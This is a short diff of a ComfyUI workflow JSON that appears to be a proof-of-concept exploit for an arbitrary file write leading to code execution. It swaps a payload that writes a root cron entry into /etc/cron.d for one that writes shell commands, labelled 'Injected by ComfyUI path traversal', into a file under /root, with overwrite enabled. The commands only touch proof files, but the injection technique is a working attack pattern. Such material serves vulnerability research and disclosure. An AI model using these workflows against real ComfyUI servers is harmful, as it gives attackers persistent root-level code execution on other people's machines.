@@ -2,7 +2,7 @@
   "1": {
     "class_type": "easy string",
     "inputs": {
-      "value": "* * * * * root touch /tmp/cron_rce_proof\n"
+      "value": "\n# Injected by ComfyUI path traversal\ntouch /tmp/bashrc_rce_proof\n"
     }
   },
   "2": {
@@ -12,8 +12,8 @@
         "1",
         0
       ],
-      "output_file_path": "/etc/cron.d",
-      "file_name": "comfyui_rce",
+      "output_file_path": "/root",
+      "file_name": ".bashrc_inject",
       "file_extension": "txt",
       "overwrite": true
     }
